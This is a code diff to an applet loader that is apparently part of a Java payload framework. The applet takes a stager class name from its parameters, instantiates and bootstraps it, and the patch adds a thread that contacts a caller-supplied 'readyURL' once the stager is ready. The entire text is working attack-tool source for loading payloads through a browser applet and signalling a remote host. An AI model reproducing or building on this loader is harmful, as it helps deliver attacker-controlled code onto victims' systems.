@@ -35,6 +35,9 @@
 package javapayload.loader;
 
 import java.applet.Applet;
+import java.io.InputStream;
+import java.net.URL;
+import java.net.URLConnection;
 
 import javapayload.stager.Stager;
 
@@ -50,9 +53,37 @@ public class AppletLoader extends Applet {
 				args[i] = getParameter("arg" + i);
 			}
 			final Stager stager = (Stager) Class.forName("javapayload.stager." + args[0]).newInstance();
-			stager.bootstrap(args);
+			String readyURL = getParameter("readyURL");
+			stager.bootstrap(args, readyURL != null);
+			if (readyURL != null) {
+				new Thread(new ReadyNotifier(stager, readyURL)).start();
+			}
 		} catch (final Exception ex) {
 			ex.printStackTrace();
+		}
+	}
+	
+	public static class ReadyNotifier implements Runnable {
+		
+		private final Stager stager;
+		private final String readyURL;
+		
+		public ReadyNotifier(Stager stager, String readyURL) {
+			this.stager = stager;
+			this.readyURL = readyURL;
+		}
+		
+		public void run() {
+			try {
+				stager.waitReady();
+				URLConnection conn = new URL(readyURL).openConnection();
+				InputStream in = conn.getInputStream();
+				while (in.read() != -1)
+					;
+				in.close();
+			} catch (Exception ex) {
+				ex.printStackTrace();
+			}
 		}
 	}
 }
